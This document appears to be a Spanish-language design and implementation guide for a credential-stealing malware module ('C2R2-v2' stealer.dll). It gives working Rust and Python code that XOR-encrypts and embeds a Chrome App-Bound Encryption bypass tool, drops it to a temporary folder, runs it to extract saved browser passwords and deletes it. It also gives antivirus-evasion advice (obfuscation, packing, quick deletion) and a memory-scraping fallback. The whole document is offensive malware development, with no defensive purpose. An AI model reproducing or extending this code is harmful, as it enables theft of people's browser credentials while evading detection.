# Integración de ChromElevator (xaitax) en C2R2-v2

## Decisión de Diseño

Después de analizar la implementación de xaitax, decidimos usar un **enfoque híbrido** que combine:
1. Nuestro código Rust para casos simples (v10/v11/DPAPI)
2. El binario pre-compilado de xaitax para v20 (App-Bound Encryption)
3. Memory injection como fallback final

## Por Qué Usar el Binario de xaitax

### ✅ Ventajas
- **Código Probado**: xaitax ha perfeccionado el bypass de ABE
- **Técnicas Avanzadas**: Process hollowing + Reflective DLL injection
- **Menos Mantenimiento**: Solo actualizamos el binario
- **Más Rápido**: No reimplementar 1000+ líneas de C++/ASM
- **Completo**: Maneja Chrome, Brave, Edge con todas las técnicas

### ⚠️ Consideraciones
- Necesita escribir exe temporal a disco (detectable)
- **Solución**: Encriptar como recurso + nombre aleatorio + eliminar inmediatamente

## Arquitectura de Integración

### Flujo de Ejecución

```
┌─────────────────────────────────────────────────────────────┐
│                      STEALER.DLL                            │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  PASO 1: Método Tradicional (chromium.rs)                  │
│  ├─ v10/v11: DPAPI + AES-GCM con master key  ✅            │
│  └─ Si v20 detectado → PASO 2                              │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  PASO 2: Elevation Service Local (elevation_service.rs)    │
│  ├─ Intenta COM con Chrome elevation service               │
│  ├─ Si funciona → passwords desencriptados ✅              │
│  └─ Si falla → PASO 3                                      │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  PASO 3: ChromElevator Binary (xaitax_wrapper.rs) 🆕       │
│  ├─ Extraer chromelevator.exe de recurso encriptado        │
│  ├─ Desencriptar con XOR                                   │
│  ├─ Escribir a %TEMP% con nombre aleatorio                 │
│  ├─ Ejecutar: chromelevator.exe --browser chrome --json    │
│  ├─ Parsear JSON output                                    │
│  ├─ Eliminar archivo temporal                              │
│  └─ Retornar passwords ✅                                  │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  PASO 4: Memory Injection (memory_injection.rs)            │
│  ├─ Escanear procesos Chrome/Edge                          │
│  ├─ Leer memoria buscando patrones de passwords            │
│  └─ Extraer passwords en texto plano ✅                    │
└─────────────────────────────────────────────────────────────┘
```

## Implementación

### 1. Preparación del Binario

#### Descargar ChromElevator

```bash
# Opción A: Desde Releases
curl -L -o chromelevator.zip https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator.zip
unzip chromelevator.zip

# Opción B: Compilar desde source (requiere MSVC)
git clone https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption.git
cd Chrome-App-Bound-Encryption-Decryption
make.bat  # Requiere Developer Command Prompt para VS
```

#### Encriptar el Binario

```bash
cd stealer-dll
mkdir -p resources

# Encriptar chromelevator_x64.exe con XOR simple
python3 << 'EOF'
import sys

def xor_encrypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# Leer binario
with open('../chromelevator_x64.exe', 'rb') as f:
    data = f.read()

# Encriptar con key random (guardamos la key en el código)
key = b'C2R2_XOR_KEY_2024_STEALER_V20_BYPASS'
encrypted = xor_encrypt(data, key)

# Guardar encriptado
with open('resources/chromelevator_x64.enc', 'wb') as f:
    f.write(encrypted)

print(f"Encrypted: {len(data)} bytes -> resources/chromelevator_x64.enc")
EOF
```

### 2. Crear Módulo Wrapper

Crear `stealer-dll/src/stealer/xaitax_wrapper.rs`:

```rust
// xaitax_wrapper.rs
// Wrapper para ejecutar chromelevator.exe y parsear resultados

use std::process::{Command, Stdio};
use std::io::Write;
use std::path::PathBuf;
use serde_json::Value;
use obfstr::obfstr;

const CHROMELEVATOR_ENCRYPTED: &[u8] = include_bytes!("../resources/chromelevator_x64.enc");
const XOR_KEY: &[u8] = b"C2R2_XOR_KEY_2024_STEALER_V20_BYPASS";

/// Desencripta el binario de chromelevator
fn decrypt_chromelevator() -> Vec<u8> {
    CHROMELEVATOR_ENCRYPTED
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ XOR_KEY[i % XOR_KEY.len()])
        .collect()
}

/// Ejecuta chromelevator.exe y retorna passwords
pub fn steal_with_chromelevator(browser: &str) -> Result<Vec<ChromelevatorPassword>, String> {
    // 1. Desencriptar binario
    let decrypted = decrypt_chromelevator();
    
    // 2. Escribir a temp con nombre aleatorio
    let temp_dir = std::env::temp_dir();
    let random_name = format!("~{}.tmp", std::process::id());
    let exe_path = temp_dir.join(&random_name);
    
    std::fs::write(&exe_path, decrypted)
        .map_err(|e| format!("Failed to write chromelevator: {}", e))?;
    
    // 3. Ejecutar con argumentos correctos
    let output_dir = temp_dir.join(format!("ce_output_{}", std::process::id()));
    std::fs::create_dir_all(&output_dir).ok();
    
    let output = Command::new(&exe_path)
        .args(&[
            obfstr!("--browser"), browser,
            obfstr!("--json"),
            obfstr!("--output"), output_dir.to_str().unwrap(),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();
    
    // 4. Eliminar exe inmediatamente
    let _ = std::fs::remove_file(&exe_path);
    
    let output = output.map_err(|e| format!("Failed to execute: {}", e))?;
    
    if !output.status.success() {
        let _ = std::fs::remove_dir_all(&output_dir);
        return Err(format!("chromelevator failed: {:?}", 
            String::from_utf8_lossy(&output.stderr)));
    }
    
    // 5. Parsear JSON output
    let passwords = parse_chromelevator_output(&output_dir)?;
    
    // 6. Limpiar
    let _ = std::fs::remove_dir_all(&output_dir);
    
    Ok(passwords)
}

#[derive(Debug, Clone)]
pub struct ChromelevatorPassword {
    pub url: String,
    pub username: String,
    pub password: String,
}

fn parse_chromelevator_output(output_dir: &PathBuf) -> Result<Vec<ChromelevatorPassword>, String> {
    let mut passwords = Vec::new();
    
    // Buscar archivos JSON en output_dir
    for entry in std::fs::read_dir(output_dir).map_err(|e| e.to_string())? {
        let entry = entry.map_err(|e| e.to_string())?;
        let path = entry.path();
        
        if path.extension().and_then(|s| s.to_str()) == Some("json") {
            let content = std::fs::read_to_string(&path)
                .map_err(|e| format!("Failed to read JSON: {}", e))?;
            
            let json: Value = serde_json::from_str(&content)
                .map_err(|e| format!("Failed to parse JSON: {}", e))?;
            
            // Parsear passwords del JSON
            if let Some(logins) = json.get("passwords").and_then(|v| v.as_array()) {
                for login in logins {
                    if let (Some(url), Some(username), Some(password)) = (
                        login.get("url").and_then(|v| v.as_str()),
                        login.get("username").and_then(|v| v.as_str()),
                        login.get("password").and_then(|v| v.as_str()),
                    ) {
                        passwords.push(ChromelevatorPassword {
                            url: url.to_string(),
                            username: username.to_string(),
                            password: password.to_string(),
                        });
                    }
                }
            }
        }
    }
    
    Ok(passwords)
}
```

### 3. Integrar en chromium.rs

Modificar `stealer-dll/src/stealer/chromium.rs`:

```rust
// En la función steal_chromium_hybrid(), después del PASO 2:

// PASO 3: Si elevation service falló, usar xaitax chromelevator
if has_v20_failed || has_v20_in_db {
    log("🔸 PASO 3: Elevation service falló → Usando ChromElevator (xaitax)...");
    
    match xaitax_wrapper::steal_with_chromelevator(browser_name) {
        Ok(xaitax_passwords) => {
            log(&format!("  ✅ {} passwords extraídos con ChromElevator", xaitax_passwords.len()));
            
            // Remover passwords v20 sin desencriptar
            all_credentials.retain(|c| !c.password.contains("v20"));
            
            // Agregar passwords de ChromElevator
            for pwd in xaitax_passwords {
                all_credentials.push(Credential {
                    browser: format!("{} (ChromElevator)", browser_name),
                    url: pwd.url,
                    username: pwd.username,
                    password: pwd.password,
                });
            }
        },
        Err(e) => {
            log(&format!("  ⚠️  ChromElevator falló: {}", e));
            log("  → Fallback a memory injection...");
            // Continuar al PASO 4 (memory injection)
        }
    }
}
```

### 4. Actualizar Cargo.toml

Agregar dependencias necesarias:

```toml
[dependencies]
serde_json = "1.0"  # Para parsear JSON de chromelevator
```

## Configuración de Compilación

### builder/Cargo.toml

Actualizar el builder para incluir el recurso encriptado:

```toml
[[bin]]
name = "builder"
path = "src/main.rs"

[build]
# Asegurar que resources/ se incluya
```

### build.rs (si es necesario)

```rust
// builder/build.rs
use std::env;
use std::path::Path;

fn main() {
    // Asegurar que recompile si cambia el recurso
    println!("cargo:rerun-if-changed=../stealer-dll/resources/chromelevator_x64.enc");
}
```

## Uso

### Desde Agent

El uso es transparente, el código automáticamente usará ChromElevator cuando sea necesario:

```rust
// En agent, simplemente llamar:
let stolen = stealer_dll::steal_all();

// El stealer intentará automáticamente:
// 1. Método tradicional
// 2. Elevation service local
// 3. ChromElevator (xaitax) ← 🆕
// 4. Memory injection
```

### Logs de Debug

```
═══════════════════════════════════════
═══ HYBRID PASSWORD THEFT: Chrome ═══
═══════════════════════════════════════
🔸 PASO 1: Método tradicional (DB + decrypt)...
  ✅ 5 passwords extraídos (método tradicional)
  ⚠️  3 passwords v20 detectados

🔸 PASO 2: Elevation service local...
  ❌ COM service no disponible

🔸 PASO 3: Usando ChromElevator (xaitax)...
  ✅ 3 passwords extraídos con ChromElevator

🎯 TOTAL: 8 passwords robados
════════════════════════════════
```

## Seguridad y Evasión

### Ofuscación del Binario
- ✅ Binario encriptado con XOR
- ✅ Key hardcoded pero ofuscada
- ✅ Nombre de archivo aleatorio
- ✅ Escritura temporal (< 1 segundo en disco)
- ✅ Eliminación inmediata después de ejecución

### Detección AV
- ⚠️ El binario de xaitax puede ser detectado por AV
- ✅ Mitigation: Encriptación + ejecución rápida + eliminación
- ✅ Solo se usa si otros métodos fallan
- ✅ Memory injection como fallback final

### Alternativas Más Sigilosas

Si el binario es detectado:

1. **Recompilar xaitax con ofuscación**
   ```bash
   # Usar LLVM obfuscator o similar
   # Agregar empacadores (UPX, etc)
   ```

2. **Usar solo memory injection**
   - Requiere Chrome corriendo
   - Más lento pero 100% en memoria

3. **Implementar técnica de xaitax en Rust**
   - Más trabajo pero máxima integración
   - Ver: APP_BOUND_ENCRYPTION_BYPASS.md

## Testing

### Test Local

```bash
# Compilar stealer con chromelevator integrado
cd stealer-dll
# Asegurar que resources/chromelevator_x64.enc existe
cargo build --release --target x86_64-pc-windows-gnu

# El DLL incluirá el binario encriptado
ls -lh target/x86_64-pc-windows-gnu/release/stealer.dll
```

### Test en Windows

```powershell
# Copiar agent.exe + stealer.dll.enc a Windows
# Ejecutar agent
.\agent.exe

# Verificar logs
type %TEMP%\stealer_debug.txt

# Buscar:
# "🔸 PASO 3: Usando ChromElevator (xaitax)..."
# "✅ X passwords extraídos con ChromElevator"
```

## Mantenimiento

### Actualizar ChromElevator

Cuando xaitax libere una nueva versión:

```bash
# 1. Descargar nuevo binario
curl -L -o chromelevator_x64.exe https://github.com/xaitax/...

# 2. Re-encriptar
python3 encrypt.py chromelevator_x64.exe resources/chromelevator_x64.enc

# 3. Recompilar stealer
cargo build --release --target x86_64-pc-windows-gnu

# 4. Re-encriptar stealer.dll con builder
cd ../builder
cargo run --release -- encrypt-module
```

## Conclusión

Esta solución híbrida nos da:
- ✅ **Máxima compatibilidad**: Funciona con v10, v11, v20
- ✅ **Robustez**: 4 niveles de fallback
- ✅ **Mantenibilidad**: Código probado de xaitax
- ✅ **Flexibilidad**: Fácil actualizar cuando Chrome cambie
- ✅ **Evasión**: Encriptación + ejecución temporal

**Estado**: Listo para implementar  
**Tiempo estimado**: 2-3 horas  
**Prioridad**: Alta (resuelve v20 completamente)
